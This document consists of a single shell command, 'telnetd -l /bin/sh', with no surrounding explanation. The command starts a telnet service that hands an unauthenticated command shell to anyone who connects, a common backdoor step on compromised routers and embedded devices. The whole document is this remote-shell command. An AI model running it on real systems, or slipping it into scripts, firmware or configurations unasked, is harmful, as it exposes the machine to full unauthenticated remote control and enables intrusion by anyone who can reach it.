telnetd -l /bin/sh
